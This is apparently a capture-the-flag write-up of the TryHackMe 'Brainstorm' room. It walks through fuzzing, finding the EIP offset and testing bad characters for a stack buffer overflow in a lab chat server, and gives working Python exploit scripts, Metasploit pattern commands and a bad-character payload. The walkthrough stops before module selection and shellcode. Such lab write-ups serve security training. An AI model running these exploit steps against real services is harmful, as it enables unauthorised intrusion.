
---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169432767-1e87baf5-db18-4c5e-9b8c-a4d0acf1c83e.png)

- ![image](https://user-images.githubusercontent.com/94720207/169433751-06697c6d-d27a-451f-8afb-1b7fba777dac.png)

---

### Accesing Files

1. First I will check that `FTP` port accesing with `anonymous` login and download the `chatserver.exe` and the `essfunc.dll` from the folder "chatserver".
    
    - ![image](https://user-images.githubusercontent.com/94720207/169436929-93cad986-8310-402d-aa84-c4f39d72d45c.png)
    
2. As this is a buffer overflow Lab, it seems we got out `.exe` and `.dll` to exploit, so, nothing much more to do here...
    
    - **Note: It's a little bit obvious that this room is based on the "Vuln Server" exploit, using default port 9999 and `essfunc.dll`...**
    
    - **Actually, `Vuln Server` is allmost the same walkthrought as `Brainstorm`, I reccomend read that write up too since it's explained in detail the buffer overflow process** 
        
    - [**Click here to read the full write up I did for `Vuln Server`**](/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md)

### Lab Setup:

- I will use the same setup for `Vuln Server`:
        
    - Using Windows 10 Pro on a bare metal CPU
        - `chatserver.exe` + `.dll` running here
        - `Immunity Debugger` + `mona` running here
                
    - Using Kali Linux in a VMware Pro VM
        - `python` scripts and tricky tricks running here
            
    - Both machines connected on the same Network 192.168.1.0/24 (My local Network)
            
    - Once I've exploited the program `vulnserver.exe` in my own machine, then I can exploit "the real" server with the final script:
            
        - `TryHackMe - Brainstorm` Network, UK.    
        
    - So I will transfer the files from the TryHackMe Machine-FTP to a folder to my Windows 10 and use from there `Immunity Debugger` and also run the `chatserver.exe` binary.
        
        - ![image](https://user-images.githubusercontent.com/94720207/169447433-211b2e85-534b-4bd5-9f2f-ff799b1472d1.png)
          
    - Easy! Let's do it! 

---

### Buffer Overflow

- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:

- **Steps to conduct a buffer overflow:**

    1. Spiking - Method to find vuln part of the program
    2. Fuzzing - Send a bunch of characters and see if we can break it
    3. Finding the Offset - At what point did we break it
    4. Overwriting the EIP - Overwriting the Poiting Address and control it
    5. Finding Bad Characters - ...
    6. Finding the Right Module - ...
    7. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
    8. Root!

---

### Spiking + Fuzzing

- First of all, I will run `chatserver.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169447906-08c9b9a4-ae4a-4634-801f-260fe36a3f63.png) 

    - ![image](https://user-images.githubusercontent.com/94720207/169447827-45f81402-77c1-4a3e-af73-bae1465a264d.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169448256-98b7a075-5faf-466c-a79b-0845450d1362.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to ChatServer:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + VulnServer Port **9999** (Default)
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 9999`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169448471-a117bef5-2d59-40e8-9a37-19f0aeb3b263.png)
 
 - **It looks that this program `Chat Server` take commands based on what you type AKA `strings` to generate a `username`**
 
 - **The username request a `max of 20 characters`**
 
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located after those 20 characters...maybe 21...maybe 2739?, 666?!, who knows?!
     
     - So, **we will do our `spiking` and `fuzzing` process to know how many bytes do we need to crash the program `chatserver.exe`**
     
         - _Actually, in this scenario is more only `fuzzing` process, because we don't need a command or string before_ 
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a user `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following:**

```python
#!/usr/bin/python

print "A" * 5000
```

- Or just using a python command:

    - `python -c 'print "A" * 5000'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169452006-9a56b1a1-57e0-4207-bebd-3ab5640cb374.png)

- And we will copy and paste it to the program, it's just like a "manual fuzzing" adn then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169452204-f1194a76-9fce-4845-8ed0-0b7618825ffb.png)

- The program didn't crash, it still working and is prompting for more info, meanwhile the `chatserver.exe` looks like this:

    - ![image](https://user-images.githubusercontent.com/94720207/169454155-e667ae59-3089-4558-8e01-4ca8d70afb6d.png)
    
        - **It looks like there are no more than 20 A's, this means, this string is protected and IS NOT VULNERABLE because it's handling correctly the `buffer space`**
        
- After we press enter we found another prompt asking for a message: 

    - ![image](https://user-images.githubusercontent.com/94720207/169453925-09edcc12-9a61-46f8-9578-33c4e0c3e970.png)

- We can add any string we want and it don't show a maximum of chars, maybe the developer forgot to sanitize this input ;) 

    - ![image](https://user-images.githubusercontent.com/94720207/169455148-cc60b367-2882-49e1-874c-570e3d92f791.png)

- Hoew about trying to crash this prompt then?... 5000 A's I choose you!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169455285-758afe2b-f9ab-46a9-a663-14e637ccfa4b.png)
    
- BOOM!!! We did it!!! The `chatserver.exe` have just crashed

    - ![image](https://user-images.githubusercontent.com/94720207/169455495-f7924ac6-a8da-42e6-ae57-f6c1c10e08db.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

        - Something like this _(the same as Vuln Server Lab!)_: 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169455788-c8e5d6de-ef79-4b4d-9de3-1aee3aa4c8a1.png)

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Chat Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Chat Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking`.**

    - **Instead, with just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

---  

### Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

- ![image](https://user-images.githubusercontent.com/94720207/169311872-83277c19-e042-4cab-8b48-197682ac4d15.png)
 
    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169460983-5457be7f-4a12-4f88-b31d-1d11a6a07153.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or something else, se just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169463114-bdcc5a86-fa84-4572-8170-17a11ac09095.png)
        
            - We crashed the `chatserver.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169463344-8af7eaf7-4f5b-4ceb-a11c-03d35fc51146.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have more than **2700** characters).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169463344-8af7eaf7-4f5b-4ceb-a11c-03d35fc51146.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`31704330`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 31704330`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169464317-4549f6d6-6022-4964-bbf1-e126d1bad552.png)

    - **Now we know that the exact offset value si `2012`** but how?
    
        - Metasploit just searched between the 5000 pattern the pattern which match exactly "31704330"
        - That exact pattern started just at `2012 bytes`, like a "crossover" ot better said: the offset
        
            - **This information is critical, because this means that exactly at `2012 bytes`, we can control `EIP` overwriting it**

---

### Overwriting the EIP

- We know that the offset for make the program crash and point exactly to the `EIP` is at `2012 bytes`.

    - **That means, `2012 bytes` just before to get to the `EIP`**
    
    - **The `EIP` itself is `4 bytes` long** 
    
- So, we going to overwrite this specific `4 bytes` just after we fill those `2012` bytes ;)  

    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
    
    - This will be saved as `1_fz3r0_brainstorm.py`  

```python
    # We declare we are using python:
    
#!/usr/bin/python

    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
    # Very similar to netcat
    
import socket

    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
    # For example: "print(sys.version)" will bring something like "id" linux bash command.
    
import sys

    # 1 - The "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
    #     variable ---> username
    #     b        ---> "b" is used before the string to send the string as Bytes and no as String
    
username = b"fz3r0"

    # 2 - The "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
    #     variable ---> message
    
        # =-=-=-=-=-=-=-=-= The variable message contains the next trick! =-=-=-=-=-=-=-=-=-=-=
    
        # "A" * 2012    ---> I'll send 2012 bytes (A's) each time
        #                    Remember, 2012 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
        
        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 

        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
        
message = b"A" * 2012 + b"B" * 4

    # The script will start the loop with "try"
    # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 

try:
        
            # Print message to console:
        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        
            # I'll use the socket module to create the variable "s"
            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
            # We will define out RHOST & RPORT (Target/Windows 10 > chatserver.exe)
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))
        
            # Once it connects with the RHOST, the script will recieve "intro" Data back from it (The welcome message and that stuff...)
            # It could work with one line, but for double checking I will try to recieve 2 packages just in case (maybe the "intro" of the program is divided in 2 load screen or something...)
            
        s.recv(1024)
        s.recv(1024)

            # Once it connects with the RHOST, and recieve the "intro" data, the program start to prompt for data.
            # I will use the Socket Module and variable "s" to send data to the chatserver
            
                # 1. First, "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
                
                    # send      = "send this"
                    # username  = "fz3r0"
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(username + b'\r\n')

            # Recieve data again (I'm sure is only 1 package this time, the prompt for the message)
            # So, here I recieve the "message prompt" from the server:
             
        s.recv(1024)
                
                # 2 - Then, "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
                    
                    # send      = "send this"
                    # message   = "b"A" * 2012 + b"B" * 4" (++++ tricky payload ++++)
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(message + b'\r\n')
       
            # Recieve data again
            
        s.recv(1024)
       
            # Close connection with RHOST
            # End of the loop
       
        s.close()

    # Exception script in case some error happen, return a message and exit. 

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- **No comment version:**

```python  
#!/usr/bin/python

import socket
import sys

username = b"fz3r0"
message = b"A" * 2012 + b"B" * 4

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to the script to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169585902-a9fdffe6-3798-45c9-a748-a2ad4d5ba6a4.png)

- Check that `chatserver.exe` and `immunity debugger` are running (otherwise restar) and...

    - Execute it! Que chille!!! 
    
        - **`python3 1_fz3r0_brainstorm.py`**  

    - ![image](https://user-images.githubusercontent.com/94720207/169586705-8ff8a617-c2ac-4c9a-b5b4-bb0f483378cd.png)

        - Note: Close it with Ctrl+C to end script
        
    - The program crashes, that's perfect! let's see `Immunity Debugger`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169587176-021d61a0-50f4-4756-943d-f8344083911e.png)

     - And this is how it looks our precious `BBBB` or `42424242`
     
     - We did it, and the EIP looks something like this: 
    
         - ![image](https://user-images.githubusercontent.com/94720207/169587833-81ba2c87-7669-47e8-b791-489563530da9.png) 
            
            - **Boooom!!!** 
            
    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
    
        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  

---

### Finding Bad Characters

- When we generate a `shellcode` we need to know what are the `good characters for the shellcode` and the `bad characters for the shellcode`.

    - We can do that by running **ALL THE HEX CHARACTERS** throught our program and see if any of them act up.
    
    - By default, the `Null Byte` : `x00` acts up
    
    - ![image](https://user-images.githubusercontent.com/94720207/169364386-bed635cb-9074-4648-8e94-3692e5cf79d7.png)

- So, we going to see how it's look like and if any of this `bad characters` act up in the program (Vuln Server)

    - If you google-fu `badchars` or follow [this link from bulbsecurity](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) (view page source for copy/paste it Mr. Hacker :P) or just use this:
    
```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

- Then, we will copy the badchars code to a new variable called `badchars`

    - **Important!** Erase the Nullbyte `\x00` and initial string `badchars =` **that's a `badchar` that makes a lot of issues by default**
    
    - **Inser "b"'s before each shellcode line (to convert to bytes each string)** 
    
    - In my case, I will save it as another file `2_fz3r0_brainstorm.py` 

- Aditionally,  I will modify the line `s.send message` with this:

    - `s.send(message + badchars + b'\r\n')` 

- 

```python  
#!/usr/bin/python

import socket
import sys

username = b"fz3r0"
message = b"A" * 2012 + b"B" * 4
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + badchars + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169592442-abecb077-b523-42d1-b476-fbdc0d000f13.png)

- Execute it! Que chille!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169593101-dc91ca54-8890-4ea4-ae0d-536a5fbae2ed.png)

    - The program crashes, that's perfect! let's see `Immunity Debugger` and send `ESP` to follow in dump (bottom left corner) 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169593293-0d3b0763-2978-4e96-81f3-45dcc1b72d25.png)

- Now, let's take a look at the dump (bottom left corner):
    
    - ![image](https://user-images.githubusercontent.com/94720207/169594119-14deb603-ddc5-419e-a153-4b0750df1585.png)
    
    - **It's easy to read it, it's just a sequence number going: 1,2,3,4,5,6,7,8,9,10<---- but in HEX...**
    
        - This means:
    
            - We are looking for a bad char in between all that sequence, if any number is missing on the sequence, then, it means that char is being used and it's a `bad char`, just like that...
        
            - **In this Lab of `Brainstorm`, there are NOT bad chars!!! That's why we cannot see any "weird" sequence like: 1,2,3,5,6...**
            
            - All numbers flow correctly from `1` to `FF` 
        
            - In technic words, we are specting all that characters to happen.
            
            - The last thing we sent was `FF`, so if we search for `FF` at the end of the list, that means that we need to search only from the beginning to `FF`.

- **Just as an example** of a `bad char` let's see this Dump from **another Lab** 

    - ![image](https://user-images.githubusercontent.com/94720207/169384923-46ad25d7-56bb-4323-ba5d-05576cdae939.png)

        - Right away in the first line we saw a "weird" sequence: **1,2,3... `B0`, `B0` ...6, 7, 8**
        
        - This means `B0` is a `bad char`, we need to note all `B0`s including the missing numbers that this miss-sequence originates.
    
    - **Write down all this numbers, because we need them to generate the final shellcode to gain root!!!**
    
        - NOTE: Remember, in this lab there are NOT `bad chars` this was just an example! 

---

### Finding the right module

- Finding the right module means that we are looking for a `.dll` or something similar inside our program (Vuln Server) that has no memory protections.  

- No memory protections means: `no depth`, `no ASLR`, `no safe SEH`, etc.

    - **There's a tool called `Mona Modules` that makes the life much easier for that... ;)**



---

### References

- https://tryhackme.com/room/brainstorm
- https://github.com/Fz3r0/Fz3r0/blob/main/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md
- https://www.youtube.com/watch?v=T1-Sds8ZHBU
